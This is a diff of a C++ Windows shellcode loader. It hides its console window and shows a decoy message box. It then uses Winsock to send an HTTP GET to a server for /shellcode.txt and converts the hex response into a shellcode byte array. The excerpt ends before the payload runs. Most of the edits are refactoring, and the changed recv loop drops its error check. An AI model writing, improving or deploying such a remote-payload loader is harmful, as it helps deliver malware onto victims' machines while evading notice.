@@ -3,7 +3,7 @@
 #include <windows.h>
 #include <iostream> 
 
-#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 using namespace std;
@@ -24,7 +24,6 @@ int main()
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
-	char buf[8192];
 
 	// address hosting shellcode
 	string server = "127.0.0.1";
@@ -32,9 +31,10 @@ int main()
 	// enter path to shellcode.txt file here..
 	string path = "/shellcode.txt";
 
-	// call message box/error function
+	// call message box function
 	messagebox();
 
+	// initialize winsock, create socket and hint structure
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
 	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	struct hostent* host = gethostbyname(server.c_str());
@@ -43,21 +43,23 @@ int main()
 	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
 	connect(sock, (SOCKADDR*)(&SockAddr), sizeof(SockAddr));
 
-	// send HTTP GET request to server
+
 	string get_http = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
+	char buf[8192];
+	string response;
+	unsigned char shellcode[8192];
+
+	// send HTTP GET request to server
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
-	int bytesReceived;
-	string response;
-	while ((bytesReceived = recv(sock, buf, 8192, 0)) > 0)
+	while (recv(sock, buf, 8192, 0))
 	{
 		response += buf;
 	}
 
 	// convert shellcode string from http response into byte array
 	string shellcode_str = response.substr(response.find("\r\n\r\n"));
-	unsigned char shellcode[8192];
 	for (int i = 0; i < shellcode_str.size() / 4; ++i)
 	{
 		shellcode[i] = strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
